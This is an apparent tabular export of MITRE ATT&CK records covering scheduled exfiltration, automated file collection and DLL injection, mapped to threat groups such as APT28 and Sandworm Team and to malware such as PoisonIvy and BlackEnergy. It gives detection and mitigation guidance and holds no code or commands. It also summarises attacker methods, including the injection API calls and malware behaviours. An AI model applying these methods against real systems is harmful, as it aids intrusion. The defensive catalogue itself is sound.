852,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.'],[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]] can set its ""beacon"" payload to reach out to the C2 server on an arbitrary and random interval.  In addition it will break large data sets into smaller chunks for exfiltration.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Exfiltration'],['Technique/T1029'],['Scheduled Transfer'],https://attack.mitre.org/wiki/Technique/T1029
853,"['Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [[Technique/T1074|Data Staged]]. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Data loss prevention']","['For all non-removable drives on a victim, [[Software/S0136|USBStealer]] executes automated collection of certain files for later exfiltration.[[CiteRef::ESET Sednit USBStealer 2014]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through [[Technique/T1056|Input Capture]] and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through [[Technique/T1110|Brute Force]] techniques.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],['Permissions to access directories and files that store information of interest.'],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Collection'],['Technique/T1119'],['Automated Collection'],https://attack.mitre.org/wiki/Technique/T1119
854,"['Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [[Technique/T1074|Data Staged]]. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Data loss prevention']",['[[Software/S0148|RTM]] monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through [[Technique/T1056|Input Capture]] and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through [[Technique/T1110|Brute Force]] techniques.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],['Permissions to access directories and files that store information of interest.'],Software: RTM,['Collection'],['Technique/T1119'],['Automated Collection'],https://attack.mitre.org/wiki/Technique/T1119
855,"['Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [[Technique/T1074|Data Staged]]. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Data loss prevention']","['[[Group/G0037|FIN6]] has used a script to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],"['Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through [[Technique/T1056|Input Capture]] and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through [[Technique/T1110|Brute Force]] techniques.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],['Permissions to access directories and files that store information of interest.'],[],['Collection'],['Technique/T1119'],['Automated Collection'],https://attack.mitre.org/wiki/Technique/T1119
856,"['Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [[Technique/T1074|Data Staged]]. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Data loss prevention']","[""[[Group/G0027|Threat Group-3390]] ran a command to compile an archive of file types of interest from the victim user's directories.[[CiteRef::SecureWorks BRONZE UNION June 2017]]""]",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through [[Technique/T1056|Input Capture]] and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through [[Technique/T1110|Brute Force]] techniques.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],['Permissions to access directories and files that store information of interest.'],[],['Collection'],['Technique/T1119'],['Automated Collection'],https://attack.mitre.org/wiki/Technique/T1119
857,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']","['An executable dropped onto victims by [[Group/G0024|Putter Panda]] aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).[[CiteRef::CrowdStrike Putter Panda]]']",['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],"['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
858,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
859,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0125|Remsec]] can perform DLL injection.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
860,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['Moafee'],['Moafee'],['G0002'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
861,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
862,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] performs code injection injecting its own functions to browser processes.[[CiteRef::F-Secure Sofacy 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: JHUHUGIT, Seduploader, ...","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
863,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0135|HIDEDRV]] injects a DLL for [[Software/S0134|Downdelph]] into the explorer.exe process.[[CiteRef::ESET Sednit Part 3]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: HIDEDRV,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
864,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['DragonOK'],['DragonOK'],['G0017'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
865,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0081|Elise]] injects DLL files into iexplore.exe.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Elise, BKDR_ESILE, Page","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
866,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0082|Emissary]] injects its DLL file into a newly spawned Internet Explorer process.[[CiteRef::Lotus Blossom Dec 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Emissary,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
867,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] injects its DLL component into svchost.exe.[[CiteRef::F-Secure BlackEnergy 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: BlackEnergy, Black Energy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
